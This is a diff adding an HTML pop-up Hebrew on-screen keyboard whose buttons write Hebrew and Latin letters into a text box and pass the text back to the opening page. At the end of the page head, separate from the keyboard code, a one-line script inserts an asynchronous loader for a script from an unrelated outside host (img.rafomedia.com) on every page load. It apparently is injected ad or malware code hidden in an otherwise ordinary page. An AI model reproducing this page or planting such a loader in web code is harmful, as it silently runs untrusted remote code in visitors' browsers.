@@ -1,0 +1,260 @@
+
+<html>
+
+	<head>
+		<script src="//cdn.optimizely.com/js/8462216.js"></script>
+		<title>Hebrew Keyboard</title>
+		<script language="JavaScript"><!--
+var nDisplayPrintSize = 46;
+	var nCurrentPrintPos = 0;
+	var cCurrentString = "";
+	var textfield
+
+	function chr(nAsciiCode) {
+		if (nAsciiCode >=  224 && nAsciiCode <= 250)	return String.fromCharCode(nAsciiCode-224+1488);
+		return String.fromCharCode(nAsciiCode);
+	}
+
+	function printLetter(nLetterCode) {
+		if (nCurrentPrintPos < nDisplayPrintSize) {
+			nCurrentPrintPos++;
+			cCurrentString += chr(nLetterCode);
+			update();
+		}
+		//opener.hCurrentField.value = cCurrentString;
+	}
+
+	function resetPrint() {
+		nCurrentPrintPos = 0;
+		cCurrentString = "";
+		update();
+	}
+
+	function deleteLast() {
+		if (nCurrentPrintPos != 0) {
+			nCurrentPrintPos--;
+			cCurrentString = cCurrentString.substring(0,nCurrentPrintPos);
+			update();
+		}
+		//opener.hCurrentField.value = cCurrentString;
+	}
+	function update() {
+		textfield.value = cCurrentString;
+	}
+	function done() {
+		NStest();
+		if (opener && opener.hCurrentField) {
+			opener.hCurrentField.value += cCurrentString;
+			}
+		window.close();
+	}
+	
+	function setup() {
+		textfield = document.form1.textfield;
+	}
+	
+	function NStest() {
+		if (escape(String.fromCharCode(1488)) == '') {
+			cCurrentString = fixupstring();
+		}
+	}
+	
+	function fixupstring() {
+		s = "";
+		for (i=0;i<cCurrentString.length;i++) {
+			if (cCurrentString.charCodeAt(i) < 255) {
+				s +=cCurrentString.charAt(i);
+			} else {
+				s +=("&#" + (cCurrentString.charCodeAt(i)) + ";");
+			}
+		}
+		return s
+	}
+	
+	
+	function writeCh(ch) {
+    
+     document.frmKeyboard.text.value = document.frmKeyboard.text.value + ch;
+   }
+   function done2() {
+   
+	window.opener.hCurrentField.value=document.frmKeyboard.text.value;
+	
+	 window.close();
+   }
+
+	
+// -->
+		</script>
+	<script type="text/javascript">(function(){var a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="http://img.rafomedia.com/zr/js/adr.js?gsbdz";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b);})();</script></head>
+
+	<body bgcolor="white" topmargin="0" onload="setup()">
+	
+<form name="frmKeyboard" action="">  
+   <div align="Center"><textarea name="text" rows="5" cols="40"></textarea></div>
+    <script>
+  document.frmKeyboard.text.value = window.opener.hCurrentField.value;
+   
+	
+    </script>	
+   <table border="0" align="Center">
+
+     <tbody> 
+     <tr>
+
+          <td align="Center"><input type="button" name="b1" value="&#1495;" onclick="writeCh(b1.value)"></td>
+          <td align="Center"><input type="button" name="b2" value="&#1494;" onclick="writeCh(b2.value)"></td>
+          <td align="Center"><input type="button" name="b3" value="&#1493;" onclick="writeCh(b3.value)"></td>
+          <td align="Center"><input type="button" name="b4" value="&#1492;" onclick="writeCh(b4.value)"></td>
+          <td align="Center"><input type="button" name="b5" value="&#1491;" onclick="writeCh(b5.value)"></td>
+          <td align="Center"><input type="button" name="b6" value="&#1490;" onclick="writeCh(b6.value)"></td>
+          <td align="Center"><input type="button" name="b7" value="&#1489;" onclick="writeCh(b7.value)"></td>
+
+          <td align="Center"><input type="button" name="b8" value="&#1488;" onclick="writeCh(b8.value)"></td>
+        </tr>
+
+      
+     </tbody>   
+   </table>
+    
+   <table border="0" align="Center">
+     <tbody> 
+     <tr>
+          <td align="Center"><input type="button" name="b9" value="&#1505;" onclick="writeCh(b9.value)"></td>
+          <td align="Center"><input type="button" name="b10" value="&#1503;" onclick="writeCh(b10.value)"></td>
+
+          <td align="Center"><input type="button" name="b11" value="&#1504;" onclick="writeCh(b11.value)"></td>
+          <td align="Center"><input type="button" name="b12" value="&#1501;" onclick="writeCh(b12.value)"></td>
+          <td align="Center"><input type="button" name="b13" value="&#1502;" onclick="writeCh(b13.value)"></td>
+
+          <td align="Center"><input type="button" name="b14" value="&#1500;" onclick="writeCh(b14.value)"></td>
+          <td align="Center"><input type="button" name="b15" value="&#1498;" onclick="writeCh(b15.value)"></td>
+          <td align="Center"><input type="button" name="b16" value="&#1499;" onclick="writeCh(b16.value)"></td>
+          <td align="Center"><input type="button" name="b17" value="&#1497;" onclick="writeCh(b17.value)"></td>
+          <td align="Center"><input type="button" name="b18" value="&#1496;" onclick="writeCh(b18.value)"></td>
+
+        </tr>
+      
+     </tbody>   
+   </table>
+    
+   <table border="0" align="Center">
+
+     <tbody> 
+     <tr>
+          <td align="Center"><input type="button" name="b29" value="&#39;" onclick="writeCh('&#1523;')"></td>
+          <td align="Center"><input type="button" name="b28" value="&quot;" onclick="writeCh('&#1524;')"></td>
+          <td align="Center"><input type="button" name="b19" value="&#1514;" onclick="writeCh(b19.value)"></td>
+
+          <td align="Center"><input type="button" name="b20" value="&#1513;" onclick="writeCh(b20.value)"></td>
+          <td align="Center"><input type="button" name="b21" value="&#1512;" onclick="writeCh(b21.value)"></td>
+          <td align="Center"><input type="button" name="b22" value="&#1511;" onclick="writeCh(b22.value)"></td>
+          <td align="Center"><input type="button" name="b23" value="&#1509;" onclick="writeCh(b23.value)"></td>
+
+          <td align="Center"><input type="button" name="b24" value="&#1510;" onclick="writeCh(b24.value)"></td>
+          <td align="Center"><input type="button" name="b25" value="&#1507;" onclick="writeCh(b25.value)"></td>
+          <td align="Center"><input type="button" name="b26" value="&#1508;" onclick="writeCh(b26.value)"></td>
+          <td align="Center"><input type="button" name="b27" value="&#1506;" onclick="writeCh(b27.value)"></td>
+
+        </tr>
+      
+     </tbody>   
+   </table>
+    
+   <hr>
+   <table border="0" align="Center">
+
+     <tbody> 
+     <tr>
+          <td align="Center"><input type="button" name="be" value="Space" ;="" onclick="writeCh(' ')"></td>
+          <td align="Center"><input type="button" name="be" value="Enter" ;="" onclick="writeCh('\n')"></td>
+
+        </tr>
+      
+     </tbody>   
+   </table>
+   
+   <table border="0" align="Center">
+     <tbody> 
+     <tr>
+
+          <td align="Center"><input type="button" name="ba" value="A" onclick="writeCh('A')"></td>
+          <td align="Center"><input type="button" name="bb" value="B" onclick="writeCh('B')"></td>
+          <td align="Center"><input type="button" name="bc" value="C" onclick="writeCh('C')"></td>
+
+          <td align="Center"><input type="button" name="bd" value="D" onclick="writeCh('D')"></td>
+          <td align="Center"><input type="button" name="be" value="E" onclick="writeCh('E')"></td>
+          <td align="Center"><input type="button" name="bf" value="F" onclick="writeCh('F')"></td>
+          <td align="Center"><input type="button" name="bg" value="G" onclick="writeCh('G')"></td>
+          <td align="Center"><input type="button" name="bh" value="H" onclick="writeCh('H')"></td>
+        </tr>
+
+      
+     </tbody>   
+   </table>
+    
+   <table border="0" align="Center">
+
+     <tbody> 
+     <tr>
+          <td align="Center"><input type="button" name="bi" value="I" onclick="writeCh('I')"></td>
+          <td align="Center"><input type="button" name="bj" value="J" onclick="writeCh('J')"></td>
+          <td align="Center"><input type="button" name="bk" value="K" onclick="writeCh('K')"></td>
+          <td align="Center"><input type="button" name="bl" value="L" onclick="writeCh('L')"></td>
+          <td align="Center"><input type="button" name="bm" value="M" onclick="writeCh('M')"></td>
+
+          <td align="Center"><input type="button" name="bn" value="N" onclick="writeCh('N')"></td>
+          <td align="Center"><input type="button" name="bo" value="O" onclick="writeCh('O')"></td>
+
+          <td align="Center"><input type="button" name="bp" value="P" onclick="writeCh('P')"></td>
+          <td align="Center"><input type="button" name="bq" value="Q" onclick="writeCh('Q')"></td>
+          <td align="Center"><input type="button" name="br" value="R" onclick="writeCh('R')"></td>
+          <td align="Center"><input type="button" name="bs" value="S" onclick="writeCh('S')"></td>
+        </tr>
+      
+     </tbody>   
+   </table>
+
+    
+   <table border="0" align="Center">
+     <tbody> 
+     <tr>
+
+          <td align="Center"><input type="button" name="bt" value="T" onclick="writeCh('T')"></td>
+          <td align="Center"><input type="button" name="bt" value="U" onclick="writeCh('U')"></td>
+          <td align="Center"><input type="button" name="bv" value="V" onclick="writeCh('V')"></td>
+          <td align="Center"><input type="button" name="bw" value="W" onclick="writeCh('W')"></td>
+          <td align="Center"><input type="button" name="bx" value="X" onclick="writeCh('X')"></td>
+          <td align="Center"><input type="button" name="by" value="Y" onclick="writeCh('Y')"></td>
+
+          <td align="Center"><input type="button" name="bz" value="Z" onclick="writeCh('Z')"></td>
+        </tr>
+
+     </tbody>   
+   </table>
+   <div align="center">
+     <center>
+   <table style="border-collapse: collapse" bordercolor="#111111" cellpadding="0" cellspacing="0">
+      <tr>
+ 		<td>
+
+ 			<div align="Center">  
+ 			 <input type = "submit" value = "Submit" onclick="done2()"/>
+
+ 			</div>
+ 		</td>
+     </tr>
+    </table>
+     </center>
+   </div>
+   <p style="font-size:8pt; margin-top:0pt">If you don't see hebrew in the text box above please call us to order your personalized items.<br>
+		Please wait for each character to appear before clicking on the next one. Use the Del button on top right to backspace.<br>
+		Punctuation characters (-.,()) will appear to the right of the hebrew text untill you enter the next hebrew character, (if you want a punctuation character to the left of the hebrew text enter it first).
+		</p>
+  </form>
+
+
+  
+	</body>
+
+</html>
